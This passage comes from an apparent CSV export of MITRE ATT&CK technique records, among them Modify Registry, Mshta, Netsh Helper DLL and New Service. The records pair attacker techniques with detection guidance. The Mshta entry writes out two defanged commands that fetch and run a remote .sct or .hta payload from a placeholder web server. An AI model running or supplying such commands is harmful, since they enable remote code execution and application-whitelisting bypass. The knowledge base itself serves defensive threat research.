Command-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute cmd commands or scripts.

Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Services may also be modified through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.

Platforms: Windows

Data Sources: Windows Registry, File monitoring, Process command-line parameters, Process monitoring

Permissions Required: Administrator, SYSTEM

Contributors: Travis Smith, Tripwire","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1031', 'external_id': 'T1031'}, {'source_name': 'TechNet Autoruns', 'description': 'Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.', 'url': 'https://technet.microsoft.com/en-us/sysinternals/bb963902'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Travis Smith, Tripwire']","","","","",""
"attack-pattern","attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4","2017-05-31T21:31:23.587Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Modify Registry","Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in Persistence and Execution.

Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API (see examples).

The Registry of a remote system may be modified to aid in execution of files as part of Lateral Movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often Valid Accounts are required, along with access to the remote system's Windows Admin Shares for RPC communication.

Detection: Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.

Monitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell, which may require additional logging features to be configured in the operating system to collect necessary information for analysis.

Platforms: Windows

Data Sources: Windows Registry, File monitoring, Process monitoring, Process command-line parameters

Defense Bypassed: Host forensic analysis

Permissions Required: User, Administrator, SYSTEM

Contributors: Bartosz Jerzman, Travis Smith, Tripwire","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1112', 'external_id': 'T1112'}, {'source_name': 'Microsoft Reg', 'description': 'Microsoft. (2012, April 17). Reg. Retrieved May 1, 2015.', 'url': 'https://technet.microsoft.com/en-us/library/cc732643.aspx'}, {'source_name': 'Microsoft Remote', 'description': 'Microsoft. (n.d.). Enable the Remote Registry Service. Retrieved May 1, 2015.', 'url': 'https://technet.microsoft.com/en-us/library/cc754820.aspx'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Windows Registry', 'File monitoring', 'Process monitoring', 'Process command-line parameters']","['User', 'Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Bartosz Jerzman', 'Travis Smith, Tripwire']","","","","","['Host forensic analysis']"
"attack-pattern","attack-pattern--a127c32c-cbb0-4f9d-be07-881a792408ec","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Mshta","Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension `.hta`. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)

Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Files may be executed by mshta.exe through an inline script: `mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))`

They may also be executed directly from URLs: `mshta http[:]//webserver/payload[.]hta`

Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: GitHub SubTee The List)

Detection: Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the binary being executed.

Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious.

Platforms: Windows

Data Sources: Process monitoring, Process command-line parameters

Defense Bypassed: Application whitelisting

Permissions Required: User

Remote Support: No

Contributors: Ricardo Dias, Ye Yint Min Thu Htut, @yeyint_mth","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1170', 'external_id': 'T1170'}, {'source_name': 'Wikipedia HTML Application', 'description': 'Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.', 'url': 'https://en.wikipedia.org/wiki/HTML%20Application'}, {'source_name': 'MSDN HTML Applications', 'description': 'Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.', 'url': 'https://msdn.microsoft.com/library/ms536471.aspx'}, {'source_name': 'Cylance Dust Storm', 'description': 'Gross, J. (2016, February 23). Operation Dust Storm. Retrieved September 19, 2017.', 'url': 'https://www.cylance.com/content/dam/cylance/pdfs/reports/Op%20Dust%20Storm%20Report.pdf'}, {'source_name': 'Red Canary HTA Abuse Part Deux', 'description': 'McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.', 'url': 'https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/'}, {'source_name': 'FireEye Attacks Leveraging HTA', 'description': 'Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.', 'url': 'https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html'}, {'source_name': 'Airbus Security Kovter Analysis', 'description': 'Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.'}, {'source_name': 'FireEye FIN7 April 2017', 'description': 'Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.', 'url': 'https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html'}, {'source_name': 'GitHub SubTee The List', 'description': '[ Smith, C. (2017, July 14). TheList.txt. Retrieved October 27, 2017.'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process monitoring', 'Process command-line parameters']","['User']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Ricardo Dias', 'Ye Yint Min Thu Htut, @yeyint_mth']","","","False","","['Application whitelisting']"
"attack-pattern","attack-pattern--84e02621-8fdf-470f-bd58-993bb6a89d91","2017-05-31T21:31:15.935Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Multi-Stage Channels","Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.

Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.

The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or Fallback Channels in case the original first-stage communication path is discovered and blocked.

Detection: Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from Discovery of the system and network information or Lateral Movement to the originating process may also yield useful data.

Platforms: Linux, macOS, Windows

Data Sources: Netflow/Enclave netflow, Network device logs, Network protocol analysis, Packet capture, Process use of network

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1104', 'external_id': 'T1104'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Netflow/Enclave netflow', 'Network device logs', 'Network protocol analysis', 'Packet capture', 'Process use of network']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--7d751199-05fa-4a72-920f-85df4506c76c","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Multi-hop Proxy","To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy.  This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.

Detection: When observing use of Multi-hop proxies, network data from the actual command and control servers could allow correlating incoming and outgoing flows to trace malicious traffic back to its source. Multi-hop proxies can also be detected by alerting on traffic to known anonymity networks (such as ) or known adversary infrastructure that uses this technique.

Platforms: Linux, macOS, Windows

Data Sources: Network protocol analysis, Netflow/Enclave netflow

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1188', 'external_id': 'T1188'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Network protocol analysis', 'Netflow/Enclave netflow']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--99709758-2b96-48f2-a68a-ad7fbd828091","2017-05-31T21:30:32.259Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Multiband Communication","Some adversaries may split communications between different protocols.  There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions.  The split could also be random to simply avoid data threshold alerts on any one communication.

Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2) Correlating alerts between multiple communication channels can further help identify command-and-control behavior.

Platforms: Linux, macOS, Windows

Data Sources: Packet capture, Netflow/Enclave netflow, Process use of network, Malware reverse engineering, Process monitoring

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1026', 'external_id': 'T1026'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--428ca9f8-0e33-442a-be87-f869cb4cf73e","2017-05-31T21:31:01.315Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Multilayer Encryption","An adversary performs C2 communications using multiple layers of encryption, typically (but not exclusively) tunneling a custom encryption scheme within a protocol encryption scheme such as HTTPS or SMTPS.

Detection: If malware uses Standard Cryptographic Protocol, SSL/TLS inspection can be used to detect command and control traffic within some encrypted communication channels. (Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation. (Citation: SEI SSL Inspection Risks) After SSL/TLS inspection, additional cryptographic analysis may be needed to analyze the second layer of encryption.

With Custom Cryptographic Protocol, if malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures. (Citation: Fidelis DarkComet)

In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Packet capture, Process use of network, Malware reverse engineering, Process monitoring

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1079', 'external_id': 'T1079'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}, {'source_name': 'SANS Decrypting SSL', 'description': 'Butler, M. (2013, November). Finding Hidden Threats by Decrypting SSL. Retrieved April 5, 2016.', 'url': 'http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840'}, {'source_name': 'SEI SSL Inspection Risks', 'description': 'Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved April 5, 2016.', 'url': 'https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html'}, {'source_name': 'Fidelis DarkComet', 'description': 'Fidelis Cybersecurity. (2015, August 4). Looking at the Sky for a DarkComet. Retrieved April 5, 2016.', 'url': 'https://www.fidelissecurity.com/sites/default/files/FTA%201018%20looking%20at%20the%20sky%20for%20a%20dark%20comet.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Packet capture', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--f2d44246-91f1-478a-b6c8-1227e0ca109d","2017-05-31T21:31:11.147Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","NTFS Extended Attributes","Data or executables may be stored in New Technology File System (NTFS) partition metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA)

The NTFS format has a feature called Extended Attributes (EA), which allows data to be stored as an attribute of a file or folder. (Citation: Microsoft File Streams)

Detection: Forensic techniques exist to identify information stored in EA. (Citation: Journey into IR ZeroAccess NTFS EA) It may be possible to monitor NTFS for writes or reads to NTFS EA or to regularly scan for the presence of modified information.

Platforms: Windows

Data Sources: File monitoring, Kernel drivers

Defense Bypassed: Signature-based detection, Anti-virus, Host forensic analysis

System Requirements: NTFS partitioned hard drive","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1096', 'external_id': 'T1096'}, {'source_name': 'Journey into IR ZeroAccess NTFS EA', 'description': 'Harrell, C. (2012, December 11). Extracting ZeroAccess from NTFS Extended Attributes. Retrieved June 3, 2016.', 'url': 'http://journeyintoir.blogspot.com/2012/12/extracting-zeroaccess-from-ntfs.html'}, {'source_name': 'Microsoft File Streams', 'description': 'Microsoft. (n.d.). File Streams. Retrieved December 2, 2014.', 'url': 'http://msdn.microsoft.com/en-us/library/aa364404'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Kernel drivers']","","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['NTFS partitioned hard drive']","","","['Signature-based detection', 'Anti-virus', 'Host forensic analysis']"
"attack-pattern","attack-pattern--bb0e0cb5-f3e4-4118-a4cb-6bf13bfbc9f2","2017-05-31T21:31:40.168Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Netsh Helper DLL","Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. (Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at `HKLM\SOFTWARE\Microsoft\Netsh`.

Adversaries can use netsh.exe with helper DLLs to proxy execution of arbitrary code in a persistent manner when netsh.exe is executed automatically with another Persistence technique or if other persistent software is present on the system that executes netsh.exe as part of its normal functionality. Examples include some VPN software that invoke netsh.exe. (Citation: Demaske Netsh Persistence)

Proof of concept code exists to load Cobalt Strike's payload using netsh.exe helper DLLs. (Citation: Github Netsh Helper CS Beacon)

Detection: It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the `HKLM\SOFTWARE\Microsoft\Netsh` registry key for any new or suspicious entries that do not correlate with known system files or benign software. (Citation: Demaske Netsh Persistence)

Platforms: Windows

Data Sources: Process monitoring, DLL monitoring, Windows Registry

Permissions Required: Administrator, SYSTEM

System Requirements: netsh

Contributors: Matthew Demaske, Adaptforward","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1128', 'external_id': 'T1128'}, {'source_name': 'TechNet Netsh', 'description': 'Microsoft. (n.d.). Using Netsh. Retrieved February 13, 2017.', 'url': 'https://technet.microsoft.com/library/bb490939.aspx'}, {'source_name': 'Demaske Netsh Persistence', 'description': 'Demaske, M. (2016, September 23). USING NETSHELL TO EXECUTE EVIL DLLS AND PERSIST ON A HOST. Retrieved April 8, 2017.', 'url': 'https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html'}, {'source_name': 'Github Netsh Helper CS Beacon', 'description': 'Smeets, M. (2016, September 26). NetshHelperBeacon. Retrieved February 13, 2017.', 'url': 'https://github.com/outflankbv/NetshHelperBeacon'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process monitoring', 'DLL monitoring', 'Windows Registry']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Matthew Demaske, Adaptforward']","","['[[Software/S0108|netsh]]']","","",""
"attack-pattern","attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88","2017-05-31T21:30:43.915Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Network Service Scanning","Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Normal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.

Platforms: Linux, macOS, Windows

Data Sources: Netflow/Enclave netflow, Network protocol analysis, Packet capture, Process command-line parameters, Process use of network

Permissions Required: User, Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1046', 'external_id': 'T1046'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture', 'Process command-line parameters', 'Process use of network']","['User', 'Administrator', 'SYSTEM']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--e7eab98d-ae11-4491-bd28-a53ba875865a","2017-05-31T21:31:38.350Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Network Share Connection Removal","Windows shared drive and Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the `net use \\system\share /delete` command. (Citation: Technet Net Use)

Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation.

Detection: Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of `net use` commands associated with establishing and removing remote shares over SMB, including following best practices for detection of Windows Admin Shares. SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.

Platforms: Windows

Data Sources: Process monitoring, Process command-line parameters, Packet capture, Authentication logs

Defense Bypassed: Host forensic analysis

Permissions Required: User, Administrator

System Requirements: Established network share connection to a remote system. Level of access depends on permissions of the account used.","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1126', 'external_id': 'T1126'}, {'source_name': 'Technet Net Use', 'description': 'Microsoft. (n.d.). Net Use. Retrieved November 25, 2016.', 'url': 'https://technet.microsoft.com/bb490717.aspx'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process monitoring', 'Process command-line parameters', 'Packet capture', 'Authentication logs']","['User', 'Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['Established network share connection to a remote system. Level of access depends on permissions of the account used.']","","","['Host forensic analysis']"
"attack-pattern","attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Network Share Discovery","Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. 

===Windows===

File sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder)

Net can be used to query a remote system for available shared drives using the `net view \\remotesystem` command. It can also be used to query shared drives on the local system using `net share`.

Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.

===Mac===

On Mac, locally mounted shares can be viewed with the `df -aH` command.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Normal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: macOS, Windows

Data Sources: Process Monitoring, Process command-line parameters, Network protocol analysis, Process use of network

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1135', 'external_id': 'T1135'}, {'source_name': 'Wikipedia Shared Resource', 'description': 'Wikipedia. (2017, April 15). Shared resource. Retrieved June 30, 2017.', 'url': 'https://en.wikipedia.org/wiki/Shared%20resource'}, {'source_name': 'TechNet Shared Folder', 'description': 'Microsoft. (n.d.). Share a Folder or Drive. Retrieved June 30, 2017.', 'url': 'https://technet.microsoft.com/library/cc770880.aspx'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process Monitoring', 'Process command-line parameters', 'Network protocol analysis', 'Process use of network']","['User']","['macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529","2017-05-31T21:30:41.399Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Network Sniffing","Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.

User credentials may be sent over an insecure, unencrypted protocol that can be captured and obtained through network packet analysis. An adversary may place a network interface into promiscuous mode, using a utility to capture traffic in transit over the network or use span ports to capture a larger amount of data. In addition, techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning, can be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

Detection: Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a man-in-the-middle attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.

Platforms: Linux, macOS, Windows

Data Sources: Network device logs, Host network interface, Netflow/Enclave netflow

Permissions Required: Administrator, SYSTEM

System Requirements: Network interface access and packet capture driver","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1040', 'external_id': 'T1040'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Network device logs', 'Host network interface', 'Netflow/Enclave netflow']","['Administrator', 'SYSTEM']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['Network interface access and packet capture driver']","","",""
"attack-pattern","attack-pattern--478aa214-2ca7-4ec0-9978-18798e514790","2017-05-31T21:30:45.613Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","New Service","When operating systems boot up, they can start programs or applications called services that perform background system functions. (Citation: TechNet Services) A service's configuration information, including the file path to the service's executable, is stored in the Windows Registry. 

Adversaries may install a new service that can be configured to execute at startup by using utilities to interact with services or by directly modifying the Registry. The service name may be disguised by using a name from a related operating system or benign software with Masquerading. Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through Service Execution.

Detection: Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence. (Citation: TechNet Autoruns) Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.

Monitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.

Platforms: Windows

Data Sources: Windows Registry, Process monitoring, Process command-line parameters

Effective Permissions: SYSTEM

Permissions Required: Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1050', 'external_id': 'T1050'}, {'source_name': 'TechNet Services', 'description': 'Microsoft. (n.d.). Services. Retrieved June 7, 2016.', 'url': 'https://technet.microsoft.com/en-us/library/cc772408.aspx'}, {'source_name': 'TechNet Autoruns', 'description': 'Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.', 'url': 'https://technet.microsoft.com/en-us/sysinternals/bb963902'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Windows Registry', 'Process monitoring', 'Process command-line parameters']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","['SYSTEM']","","","",""
